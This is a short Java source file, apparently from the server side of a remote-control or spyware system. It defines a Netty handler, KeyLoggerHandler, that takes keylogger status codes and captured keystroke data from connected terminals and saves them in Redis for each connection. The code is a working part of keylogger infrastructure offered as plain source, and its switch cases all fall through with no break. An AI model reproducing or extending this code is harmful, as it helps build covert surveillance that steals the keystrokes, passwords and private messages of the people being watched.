package RequestHandler;

import Config.Config;
import broadcast.Msg;
import io.netty.channel.ChannelHandlerContext;
import javabean.SocketInfo;


public class KeyLoggerHandler extends MyRequestHanlder {
    @Override
    public void handlerRequest(SocketInfo socketInfo, ChannelHandlerContext ctx) {
        if (socketInfo.getResultCode() / 1000 == 2) {
            System.out.println("KeyLoggerHandler handle");
            switch (socketInfo.getResultCode()) {
                case Config.Result_Code_HasStartLogger:
                    redisUtil.setTerminalKeyLoggerStatus(ctx.channel().id().toString(), "" + socketInfo.getResultCode());
                case Config.Result_Code_StartKeyLogger:
                    redisUtil.setTerminalKeyLoggerStatus(ctx.channel().id().toString(), "" + socketInfo.getResultCode());
                case Config.Result_Code_KeyLoggerNotOpen:
                    redisUtil.setTerminalKeyLoggerStatus(ctx.channel().id().toString(), "" + socketInfo.getResultCode());
                case Config.Result_Code_ReturnKeyLogger:
                    redisUtil.setTerminalKeyLoggerStatus(ctx.channel().id().toString(), "" + socketInfo.getResultCode());
                    redisUtil.setTerminalKeyLoggerInfo(ctx.channel().id().toString(), socketInfo.getResultMsg());
            }
        } else {
            successor.handlerRequest(socketInfo, ctx);
        }

    }
}
